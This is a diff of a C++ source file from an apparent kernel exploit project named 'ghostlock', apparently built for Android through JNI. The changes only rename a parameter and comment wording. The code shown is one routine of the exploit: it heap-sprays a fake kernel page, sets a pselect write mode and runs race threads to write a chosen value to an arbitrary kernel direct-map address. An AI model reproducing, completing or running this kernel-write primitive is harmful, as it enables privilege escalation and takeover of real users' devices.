@@ -5,7 +5,7 @@
  *  route, clear, report) and the two comments that say why the arm is checked and why a target
  *  outside the direct map is not attempted.
  *
- *  Three steps the C body reached through file scope are seams here, and a missing seam is a
+ *  Three steps the C body reached through file scope are ops here, and a missing landing is a
  *  named refusal -- never a step quietly skipped:
  *      set_write_mode   (C: set_pselect_write_mode)
  *      prepare_page     (C: prepare_good_kernel_page), which also fills products.page_base
@@ -14,7 +14,7 @@
  *
  *  Not moved: the three TIMER(...) calls the C body used to time the spray and the route
  *  ("heap spray start", "heap spray done", "PI route done"). This tree has its own logging
- *  seam and no timer macro, and inventing one here would add a thing the tree does not have.
+ *  landing and no timer macro, and inventing one here would add a thing the tree does not have.
  *  The omission is recorded rather than silent.
  */
 #include "jni/write_one.hpp"
@@ -34,7 +34,7 @@ namespace ghostlock::jni {
 
     int do_one_write(const WriteOneParams &params, const DirectMapBounds &bounds,
                      race::RaceContext &context, SprayProducts &products,
-                     const WriteSeams &seams) noexcept {
+                     const WriteSeams &ops) noexcept {
         log("info", "write one", static_cast<std::int64_t>(params.target));
         /* a target outside the direct map is wrong by construction, so it is worth neither a
          *  spray nor a retry */
@@ -43,19 +43,19 @@ namespace ghostlock::jni {
             return 0;
         }
         /* Parameterised refusals: the C body could assume these existed at file scope. */
-        if (seams.set_write_mode == nullptr) {
+        if (ops.set_write_mode == nullptr) {
             context.route_result.step = kStepNoMode;
-            log("error", "write one: set_write_mode seam is absent");
+            log("error", "write one: set_write_mode landing is absent");
             return 0;
         }
-        if (seams.prepare_page == nullptr) {
+        if (ops.prepare_page == nullptr) {
             context.route_result.step = kStepNoPage;
-            log("error", "write one: prepare_page seam is absent");
+            log("error", "write one: prepare_page landing is absent");
             return 0;
         }
-        if (seams.clear_write == nullptr) {
+        if (ops.clear_write == nullptr) {
             context.route_result.step = kStepNoClear;
-            log("error", "write one: clear_write seam is absent");
+            log("error", "write one: clear_write landing is absent");
             return 0;
         }
         /* Both transports write *(target) := value through the erase left-only relink: waiter
@@ -63,13 +63,13 @@ namespace ghostlock::jni {
          *  fixup runs. leaf=1 is the value=0 payload. */
         /* main.c:376 sets the child-node switch first, then hands the mode to
          *  set_pselect_write_mode. That order is kept here even though the two are
-         *  independent today: the seam does not read the switch, but that is a fact about
+         *  independent today: the landing does not read the switch, but that is a fact about
          *  its current body, not a guarantee. */
         context.write_mode.pselect_child_node = params.leaf == kLeafArm ? 0 : 1;
-        (void) seams.set_write_mode(params.target, params.mode, seams.context);
-        if (!seams.prepare_page(products, seams.context)) {
+        (void) ops.set_write_mode(params.target, params.mode, ops.context);
+        if (!ops.prepare_page(products, ops.context)) {
             log("warning", "heap spray failed");
-            seams.clear_write(seams.context);
+            ops.clear_write(ops.context);
             return 0;
         }
         /* only the leaf arm stores zero, and the value arm does not, so a leaf payload fired at
@@ -81,11 +81,11 @@ namespace ghostlock::jni {
             context.route_result.step = kStepArmMismatch;
             log("warning", "payload arm mismatch, skipping write",
                 static_cast<std::int64_t>(products.fake_right));
-            seams.clear_write(seams.context);
+            ops.clear_write(ops.context);
             return 0;
         }
         const bool routed = run_main_route_threads(context);
-        seams.clear_write(seams.context);
+        ops.clear_write(ops.context);
         if (!routed) {
             log("warning", "the route did not produce a verified write");
         }
